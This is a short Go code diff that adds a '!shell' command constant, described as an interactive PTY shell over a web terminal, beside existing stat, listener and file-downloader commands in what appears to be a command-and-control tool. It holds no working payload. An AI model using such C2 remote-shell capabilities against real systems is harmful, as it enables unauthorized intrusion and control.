@@ -20,4 +20,5 @@ const (
 	C2CmdStat           = "!stat"
 	C2CmdListener       = "!listener"
 	C2CmdFileDownloader = "!file_downloader"
+	C2CmdShell          = "!shell" // interactive PTY shell session (web virtual terminal)
 )
